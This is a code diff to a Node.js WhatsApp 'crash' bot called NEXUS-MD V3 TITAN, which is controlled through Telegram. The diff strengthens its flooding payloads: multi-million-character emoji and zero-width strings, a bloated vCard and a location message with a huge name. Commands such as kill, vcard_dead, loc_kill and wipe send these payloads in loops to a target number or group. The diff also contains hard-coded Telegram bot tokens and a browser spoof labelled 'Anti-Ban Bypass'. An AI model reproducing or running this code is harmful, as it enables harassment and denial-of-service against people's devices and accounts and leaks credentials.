@@ -11,7 +11,7 @@ const pino = require('pino');
 const express = require('express');
 
 // --- ⚙️ TITAN CONFIG ---
-const TG_TOKEN = '8745872876:AAGB05dkcWF1uHJZgn6nFEZf325l4cluDfs'; 
+const TG_TOKEN = '8246779983:AAEDuC8a7QMd2OwNvLDJvDGGwLkFk5nc9k8'; // උඹේ අලුත්ම API එක
 const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -22,9 +22,9 @@ let botConfig = {
     prefix: ".",
 };
 
-// 24/7 Stability Server
+// 24/7 Stability Engine
 app.get('/', (req, res) => res.send('TITAN OBLITERATOR ONLINE ☠️'));
-app.listen(PORT, () => console.log(`Titan Core Active: ${PORT}`));
+app.listen(PORT, () => console.log(`Titan System Active: ${PORT}`));
 
 async function startNexus() {
     const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
@@ -35,34 +35,35 @@ async function startNexus() {
             keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
         },
         logger: pino({ level: 'silent' }),
-        browser: ["Ubuntu", "Chrome", "22.0.04"], // 🔥 Anti-Ban Engine
+        browser: ["Ubuntu", "Chrome", "22.0.04"], // 🔥 Anti-Ban Bypass
         syncFullHistory: false
     });
 
-    // --- 🤖 STABLE TELEGRAM HANDLER (ANTI-LOOP) ---
+    // --- 🤖 STABLE TG API HANDLER ---
     const processed = new Set();
     tgBot.on('message', async (msg) => {
         if (msg.from.is_bot || processed.has(msg.message_id)) return;
         processed.add(msg.message_id);
 
         if (msg.text === '/start') {
-            const welcome = `🔱 *NEXUS-MD V3: TITAN DESTROYER*\n\nStatus: *Global Active*\nMaster: *Sasiya MD*\n\nEnter Number with 94 code.`;
+            const welcome = `🔱 *NEXUS-MD V3: TITAN DESTROYER*\n\nStatus: *Global Active*\nMaster: *Sasiya MD*\n\nEnter Target Number with 94 code.`;
             return tgBot.sendMessage(msg.chat.id, welcome, { parse_mode: 'Markdown' });
         }
 
         if (msg.text && /^\d+$/.test(msg.text) && msg.text.length > 9) {
             try {
+                tgBot.sendMessage(msg.chat.id, "⏳ *Pairing via Secure Titan API...*");
                 let code = await sock.requestPairingCode(msg.text.trim());
                 tgBot.sendMessage(msg.chat.id, `⚡ *TITAN KEY:* \`${code}\``, { parse_mode: 'Markdown' });
-            } catch (e) { tgBot.sendMessage(msg.chat.id, "❌ API Blocked! Retry."); }
+            } catch (e) { tgBot.sendMessage(msg.chat.id, "❌ API Blocked! Retry later."); }
         }
         setTimeout(() => processed.delete(msg.message_id), 3600000);
     });
 
-    // --- ☣️ GLOBAL 8,000,000+ TITAN PAYLOADS ---
-    const p_titan = "☠️".repeat(1000000) + "​".repeat(7000000); // UI & System Death
-    const p_vcard = "BEGIN:VCARD\nVERSION:3.0\nN:;Titan-Nexus;;;\nFN:Titan\n" + "TEL;type=CELL;waid=94767475809:".repeat(100000) + "\nEND:VCARD"; // Contact System Death
-    const p_loc = { location: { degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name: "NEXUS-TITAN DEATH ZONE" + "​".repeat(2000000) } };
+    // --- ☣️ GLOBAL 8.5M TITAN PAYLOADS ---
+    const p_titan = "☠️".repeat(1000000) + "​".repeat(7500000); // System Death
+    const p_vcard = "BEGIN:VCARD\nVERSION:3.0\nN:;Titan-Nexus;;;\nFN:Titan\n" + "TEL;type=CELL;waid=94767475809:".repeat(110000) + "\nEND:VCARD"; // Contact Crash
+    const p_loc = { location: { degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name: "NEXUS-TITAN DEATH ZONE" + "​".repeat(2500000) } };
 
     // --- 📩 THE TITAN ATTACK HANDLER ---
     sock.ev.on('messages.upsert', async (m) => {
@@ -87,8 +88,8 @@ async function startNexus() {
 ┃  🔱 *NEXUS-MD V3: TITAN* 🔱
 ┗━━━━━━━━━━━━━━━━━━━━━━━━┛
 ┃
-┃ 🩸 *POWER:* \`8,000,000+\`
-┃ ⚡ *MODE:* _System Obliterator_
+┃ 🩸 *POWER:* \`8,500,000+\`
+┃ ⚡ *MODE:* _Global Destroyer_
 ┃ 💻 *DEV:* _Sasiya MD_
 ┃
 ┣━━━━━━━━━━━━━━━━━━━━━━━━┓
@@ -115,55 +116,54 @@ async function startNexus() {
                     await sock.sendMessage(from, { text: titanMenu });
                     break;
 
-                // --- 🚀 ATTACK LOGIC (VIP COMMANDS) ---
                 case 'kill':
                 case 'crash':
                 case 'the_end':
                 case 'destroy':
                 case 'freeze':
                     if (!targetNum) return;
-                    await sock.sendMessage(from, { text: `🔱 *TITAN ATTACKING:* ${targetNum}\n🚀 *POWER:* 8M Overload...` });
-                    for(let i=0; i<40; i++) {
+                    await sock.sendMessage(from, { text: `🔱 *TITAN ATTACKING:* ${targetNum}\n🚀 *POWER:* 8.5M Overload...` });
+                    for(let i=0; i<45; i++) {
                         await sock.sendMessage(targetJid, { text: p_titan });
-                        await delay(80); 
+                        await delay(70); 
                     }
-                    await sock.sendMessage(from, { text: "✅ *TARGET DELETED!* 💀" });
+                    await sock.sendMessage(from, { text: "✅ *TARGET OBLITERATED!* 💀" });
                     break;
 
                 case 'vcard_dead':
                     if (!targetNum) return;
                     await sock.sendMessage(from, { text: "📇 *INJECTING TITAN V-CARD...*" });
-                    for(let i=0; i<30; i++) {
+                    for(let i=0; i<35; i++) {
                         await sock.sendMessage(targetJid, { text: p_vcard });
-                        await delay(120);
+                        await delay(100);
                     }
                     break;
 
                 case 'loc_kill':
                     if (!targetNum) return;
                     await sock.sendMessage(from, { text: "📍 *SENDING TITAN LOCATION...*" });
-                    for(let i=0; i<25; i++) {
+                    for(let i=0; i<30; i++) {
                         await sock.sendMessage(targetJid, p_loc);
-                        await delay(150);
+                        await delay(120);
                     }
                     break;
 
                 case 'call_hang':
                 case 'vid_bomb':
                     if (!targetNum) return;
-                    await sock.sendMessage(from, { text: "📞 *INITIATING CALL/VIDEO CRASH...*" });
-                    for(let i=0; i<35; i++) {
-                        await sock.sendMessage(targetJid, { text: "҉".repeat(2000000) });
-                        await delay(80);
+                    await sock.sendMessage(from, { text: "📞 *INITIATING CALL/VIDEO OVERFLOW...*" });
+                    for(let i=0; i<40; i++) {
+                        await sock.sendMessage(targetJid, { text: "҉".repeat(2500000) });
+                        await delay(70);
                     }
                     break;
 
                 case 'wipe':
                     if (!args[0]) return;
-                    await sock.sendMessage(from, { text: "🌀 *GROUP NUCLEAR WIPE INITIATED...*" });
-                    for(let i=0; i<60; i++) {
+                    await sock.sendMessage(from, { text: "🌀 *GROUP NUCLEAR WIPE...*" });
+                    for(let i=0; i<65; i++) {
                         await sock.sendMessage(args[0], { text: p_titan });
-                        await delay(100);
+                        await delay(90);
                     }
                     break;
             }
